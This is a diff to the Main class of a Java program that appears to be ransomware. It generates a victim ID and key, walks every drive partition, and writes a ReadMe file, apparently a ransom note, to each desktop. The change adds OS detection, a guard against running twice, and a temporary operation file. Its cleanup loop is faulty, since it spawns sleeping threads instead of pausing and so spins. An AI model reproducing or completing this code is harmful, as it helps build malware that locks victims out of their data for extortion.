@@ -7,17 +7,38 @@ import files.CreateReadMeFile;
 import files.GetFiles;
 import genrators.GenerateID;
 import genrators.GenerateKey;
+import gui.Dialogs;
+import helpers.Constants;
+import helpers.FunctionsHelper;
 
 import java.io.File;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.util.ArrayList;
 
 public class Main {
     public static void main(String[] args) {
+        FileWriter operationFile = null;
+        // Get os
+        String os = FunctionsHelper.getOs();
+
+        // Check already run
+        if (FunctionsHelper.isRunning()) {
+            Dialogs.alreadyRunning();
+            System.exit(0);
+        }
+        // Create operation file
+        try {
+            operationFile = new FileWriter(Constants.operationFileName);
+        } catch (IOException e) {
+            Dialogs.errorDialog(e.getMessage());
+            System.exit(1);
+        }
+
         String id = new GenerateID(20).getID();
         String key = new GenerateKey(16).getKye();
         CreateReadMeFile readMeFile = new CreateReadMeFile(id, key, 0.0f);
-        GetFiles files = new GetFiles();
+        GetFiles files = new GetFiles(os);
 
         // get partitions
         File[] partitions = files.getDrivers();
@@ -40,7 +61,19 @@ public class Main {
                 readMeFile.create(desktop.toString());
             } catch (IOException ignored){}
         }
-        
+
+        // Delete operation file
+        try {
+            operationFile.close();
+            File file = new File(Constants.operationFileName);
+            while(!file.delete() && file.exists()) {
+                new Thread( () -> {
+                    try {
+                        Thread.sleep(300000);
+                    } catch (InterruptedException ignored) {}
+                }).start();
+            }
+        } catch (IOException ignored) {}
 
         // Test
 //        File file = new File("tests/test.txt");
